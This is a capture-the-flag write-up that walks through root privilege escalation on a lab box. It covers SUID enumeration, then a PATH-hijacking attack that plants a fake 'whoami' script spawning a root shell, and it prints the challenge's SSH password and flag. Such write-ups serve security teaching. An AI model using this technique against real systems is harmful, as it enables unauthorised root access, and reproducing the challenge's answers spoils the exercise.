# Web Privilege Escalation Maverick.md

### Initial Access

```bash
$ ssh -p 2022 maverick@ctf-18.security.cs.pub.ro
Password: jXztBtEWKYRMrjAF

Welcome to Ubuntu 20.04.1 LTS...
Last login: Tue Jul 22 15:39:28 2025
```

### Check for sudo Rights

```bash
$ sudo -l
[sudo] password for maverick:
Sorry, user maverick may not run sudo on maverick.
No sudo privileges were granted.
```

### Quick File‑System Enumeration

List SUID binaries (common PE): `$ find / -type f -perm /4000 -exec ls -ld {} \; 2>/dev/null` Scan this list manually for anything unusual.

Also looked at the home directory:

```bash
$ ls
mybin  scripts
```

### Inspect ~/scripts

```bash
$ cd scripts
$ ls
favorite-quote  whoami
```

- favorite-quote is a binary
- whoami is presumably a script or binary

Running them:

```bash
$ ./favorite-quote
Follow no path... Make your own!!! Life is what you make it...

Your faitfhully,
```

root: Even though we’re invoking it as maverick, it prints “root” as the author—strongly suggesting it’s a SUID root binary.

```bash
$ ./whoami
$ id
uid=1000(maverick) gid=1000(maverick)
```

The favorite-quote program calls system("whoami") after dropping into root context, so modifying whoami in our PATH yields a root shell.

### Exploitation via PATH Hijacking

Backup original whoami:

```bash
$ mv whoami whoami.orig
```

Create malicious whoami that spawns a root shell:

```bash
$ cat > whoami << 'EOF'
#!/bin/bash
# this will run with EUID=0
/bin/bash -p -i
EOF
$ chmod +x whoami
```

Prepend `./scripts` to PATH: `$ export PATH="$(pwd):$PATH"`. Invoke the SUID binary:

```bash
$ ./favorite-quote
Follow no path... Make your own!!! Life is what you make it...

Your faitfhully,
root@maverick:~/scripts# id
uid=0(root) gid=0(root) groups=0(root),1000(maverick)
```

We now have an interactive root shell.

### Get the flag
```bash
root@maverick:~/scripts# cat /root/flag.txt
SSS{t00_m4ny_f4c3b00k_qu0t3s}
```
